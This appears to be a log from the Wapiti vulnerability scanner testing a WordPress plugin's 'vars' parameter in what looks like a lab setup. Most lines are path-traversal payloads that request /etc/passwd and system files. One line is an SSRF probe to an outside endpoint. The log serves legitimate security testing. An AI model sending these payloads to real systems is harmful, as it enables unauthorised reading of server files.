2024-03-21 15:13:52.051 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 15:13:52.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 15:13:52.061 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:52.066 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:52.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 15:13:52.076 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 15:13:52.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.085 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:52.095 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:52.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.105 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.110 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-21 15:13:52.115 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 15:13:52.120 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-21 15:13:52.125 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:52.129 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-21 15:13:52.134 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:52.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.150 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=totop-link.css.php (0)
2024-03-21 15:13:52.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=totop-link.css.php%00 (0)
2024-03-21 15:13:52.161 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=totop-link.css.php%3A%3A%24DATA (0)
2024-03-21 15:13:52.192 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 15:13:52.216 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 15:13:52.226 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:52.231 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-21 15:13:52.303 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 15:13:52.316 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:52.316 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F24pl3v%2F1%2F76617273%2F (0)
2024-03-21 15:13:52.340 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=24pl3v for results, please wait...
2024-03-21 15:13:54.698 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 15:13:54.780 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 15:13:54.801 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//totop-link.json/
2024-03-21 15:13:54.801 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//totop-link.json/web_03212024_1513.html with a browser to see this report.
